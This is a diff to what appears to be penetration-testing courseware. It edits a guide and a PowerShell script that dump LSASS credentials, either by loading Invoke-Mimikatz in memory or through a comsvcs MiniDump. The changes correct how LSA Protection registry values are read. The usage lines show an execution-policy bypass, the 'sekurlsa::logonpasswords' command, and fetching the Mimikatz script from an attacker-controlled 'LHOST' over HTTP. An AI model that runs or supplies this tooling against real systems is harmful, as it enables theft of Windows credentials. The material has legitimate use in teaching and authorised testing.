@@ -8,9 +8,7 @@ If LSASS access fails, that is not the end — try LSA Secrets, SAM, Autologon, 
 
 ## Classify before touching LSASS
 
-If `whoami /priv` has no `SeDebugPrivilege` and you are not SYSTEM, skip the dump and go to alternate sources. If `RunAsPPL` is **1 or 2**, LSA Protection is on and a normal dump is denied. If `LsaCfgFlags` is non-zero, treat that as Credential Guard and do not assume a bypass. If neither flag is set but the tool still dies, change the load shape, not the dump target.
-
-<!-- VERIFY: m07-invoke-mimikatz-reflect.ps1 still aborts only when RunAsPPL -ge 2 (and its comment says "1=signature required; 2=signature+PPL start"). Courseware (§17.3) and the lab set RunAsPPL=1 to enable LSA Protection; Microsoft documents both 1 (UEFI lock) and 2 (no UEFI lock) as enabled. Confirm before changing the script. -->
+If `whoami /priv` has no `SeDebugPrivilege` and you are not SYSTEM, skip the dump and go to alternate sources. If `RunAsPPL` is **1 or 2**, LSA Protection is on and a normal dump is denied. If `LsaCfgFlags` is non-zero, treat that as Credential Guard and do not assume a bypass. Registry values are configuration hints, not a runtime guarantee: an absent/zero `RunAsPPL` does not rule out UEFI-locked or automatically enabled protection. Confirm WinInit event 12 (LSASS started protected) before treating the host as unprotected.
 
 ```powershell
 # Current rights and SeDebugPrivilege
@@ -65,7 +63,7 @@ If the dump succeeds but offline parse is empty, match `sekurlsa::minidump` / Mi
 Purpose: Credential collection when LSASS has no strong protection — load Invoke-Mimikatz in memory (no on-disk ps1/exe) or fall back to comsvcs MiniDump
 Scenario: 46 (classify first: this script only handles the “confirmed LSASS is touchable” branch; if PPL/Credential Guard is on, abandon per module guidance and use m07-credential-sources.ps1)
 Depends: PowerShell 3.0+; Invoke mode needs a readable Invoke-Mimikatz.ps1 (local file or HTTP source);
-         MiniDump mode needs SeDebugPrivilege (admin/SYSTEM); both are denied under RunAsPPL>=2 or Credential Guard
+         MiniDump mode needs SeDebugPrivilege (admin/SYSTEM); normal LSASS access is blocked with RunAsPPL=1 or 2; Credential Guard separately isolates secrets
 Usage: powershell -ep bypass -f m07-invoke-mimikatz-reflect.ps1 -Mode Invoke -SourceFile C:\Windows\Temp\Invoke-Mimikatz.ps1 -Command '"sekurlsa::logonpasswords" "exit"'
        Remote source: ... -Mode Invoke -SourceUrl http://LHOST/Invoke-Mimikatz.ps1
        Dump mode: ... -Mode MiniDump -LsassPid 1234 -DumpDir C:\Windows\Temp
@@ -91,13 +89,15 @@ function Test-Admin {
     return ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -or $id.IsSystem)
 }
 function Get-LsaProtectionStatus {
-    # RunAsPPL: 0=off; 1=signature required; 2=signature+PPL start (normal dump blocked). Non-zero LsaCfgFlags hints Credential Guard direction.
+    # RunAsPPL: 1=enabled with UEFI lock (where supported); 2=enabled without UEFI lock (Windows 11 22H2+).
+    # An absent/zero registry value does not prove protection is off (UEFI lock / automatic enablement).
+    # Non-zero LsaCfgFlags hints Credential Guard configuration.
     $out = [pscustomobject]@{ RunAsPPL = 0; LsaCfgFlags = 0 }
     try {
         $l = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL 2>$null)
-        if ($l -match '0x([0-9a-fA-F]+)') { $out.RunAsPPL = [Convert]::ToInt32($Matches[1], 16) }
+        if (($l -join "`n") -match '0x([0-9a-fA-F]+)') { $out.RunAsPPL = [Convert]::ToInt32($Matches[1], 16) }
         $c = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags 2>$null)
-        if ($c -match '0x([0-9a-fA-F]+)') { $out.LsaCfgFlags = [Convert]::ToInt32($Matches[1], 16) }
+        if (($c -join "`n") -match '0x([0-9a-fA-F]+)') { $out.LsaCfgFlags = [Convert]::ToInt32($Matches[1], 16) }
     } catch { }
     return $out
 }
@@ -139,8 +139,8 @@ if (-not (Test-Admin)) {
 $priv = Enable-SeDebugPrivilege
 Write-Output ("[+] SeDebugPrivilege available (enable attempted): {0}" -f $priv)
 $prot = Get-LsaProtectionStatus
-Write-Output ("[+] LSA protection: RunAsPPL={0} LsaCfgFlags={1} (>=2 means normal dump is denied)" -f $prot.RunAsPPL, $prot.LsaCfgFlags)
-if (($prot.RunAsPPL -ge 2 -or $prot.LsaCfgFlags -ne 0) -and -not $Force) {
+Write-Output ("[+] LSA protection: RunAsPPL={0} LsaCfgFlags={1} (1 or 2 configures LSA Protection; confirm runtime state)" -f $prot.RunAsPPL, $prot.LsaCfgFlags)
+if (($prot.RunAsPPL -in 1,2 -or $prot.LsaCfgFlags -ne 0) -and -not $Force) {
     Write-Output "[-] LSASS protected by LSA Protection / Credential Guard: per module guidance do not assume a bypass — switch to m07-credential-sources.ps1 (SAM/LSA Secrets/registry/DPAPI/config/GPP/scheduled tasks)."
     exit 2
 }
